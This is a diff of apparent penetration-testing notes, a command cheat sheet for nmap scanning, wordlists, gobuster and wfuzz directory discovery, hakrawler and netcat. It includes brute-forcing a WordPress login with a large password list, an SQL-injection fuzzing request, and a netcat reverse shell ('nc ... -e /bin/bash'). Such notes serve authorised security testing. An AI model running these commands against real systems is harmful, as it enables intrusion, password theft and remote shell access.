@@ -1,5 +1,76 @@
-Wireshark     -  You have to capture the keys for https good http with defaults. 
-SQLmap        - 
-BurpSuite     - Proxy and much more
-OWASP ZAP     -  Zed Attack Proxy tool
+Tools:
+
+NMAP-
+nmap -O -Pn mycorp  OS detection
+nmap --script vuln example.com
+ls -lsaht /usr/share/nmap/scripts | grep -i 'http'
+nmap -A example.com   Comprehensize
+nmap -sV -p 80,8080,80-89,8080-8089,443,8443,4443
+
+nmap -p80 --script=http-enum 172.16.1.1
+nmap -p80 --script=http-methods --scripts-args http-methods.url-paths='/wp-includes/' 172.16.1.1
+--script=http-methods,http-ls,http-robots.txt,http-cookie-flags,http-cors
+
+Wordlists-
+apt install seclists
+ls /usr/share/seclists
+
+/usr/share/wordlists/rockyou.txt
+/usr/share/wordlists/dirb/common.txt
+
+Creating a custom wordlist:
+cewl can build a wordlist based on the customers website
+sudo cewl -d 2 -m 5 -w ourwordlist.txt www.mycorp.com
+-d 2 Two depth on website crawls -m minimum world length is 5 charachters. May need to sort and uniq this file. 
+Now ourwordlist.txt will be every word 5 charachters or longer within 2 pages deep on the website. 
+ls -sa /usr/bin | sed 's/[0-9]*//g' | sed -r 's/\s+//g' |sort -u > $HOME/binaries-wordlist.txt; Linux binaries wordlist
+
+Gobuster-
+May find subdomains and directories. Very fast for these scenarios. 
+apt install gobuster
+
+gobuster dir -u http://mycorp" -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
+-b blocks things, in this case redirects | -t if for 5 threads. 
+
+gobuster dns -d mycorp.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+
+
+wfuzz-
+Discover, files, directories, parameters, fuzz parameters, fuzz post data
+Discover-
+	files     - wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 http://mycorp:80/Fuzz
+	dir       - wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 301,404,403 http://mycorp:80/Fuzz/
+	parameter       - wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 ttp://mycorp:80/index.php?FUZZ=data
+        parameter value - wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://mycorp:80/index.php?fpv=FUZZ
+        
+Fuzzing- Really this is brute forcing fuzzing is more of discovery. 
+	post data - wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://mycorp:80/wp-login.php
+		You will have to stop it after 10 or so iterations and look at the size of the response for failure and omit that. 
+	post data - wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" -hh 7201 http://mycorp:80/wp-login.php
+		After successful fuz of a password you will typically get a cookie and a redirect to dashboard or homepage. 
+		Once you are authenticated. Fuzz directories and files again. 
+
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie:PHPSESSID=fjkdkfds283948392hjdhfjkdfh3892" http://mycorp:80/user/?uid=FUZZ
+	difference between -b and -H for cookies. -b is for cookie only, while -H you can put in any header you like, such as a user-agent. 
+wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=FJKDFEJNKFNJKDF47598475984KHFJD -d "" "http://mycorp/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"
+-m specifies zip iterator should be used to combine payload. -m -z list,1-2-3 -z list,a-b-c;  This would give you 1 a | 2 b | 3 c   if you did not zip it would be 1 a|1b|1c|2a|2b|2c|3a|3b|3c
+-b for authentication -b adds in cookies. 
+-d is for post request so it is not a get. 
+
+Hakrawler-
+sudo apt-get install -y hakrawler
+which hakcrawler
+
+single domain - echo http://www.mycorp.com | hakrawler
+multidomain   - echo "https://www.mycorp.com/" > urls.txt
+cat urls.txt |./hakrawler
+	
+
+netcat- 
+Listener   netcat -nlvp 9090      
+nc 192.168.1.100 9090 -e /bin/bash
+
+
+SQLMAP-
+
 Tidos         -  https://www.geeksforgeeks.org/tidos-framework-offensive-web-application-penetration-testing-framework/
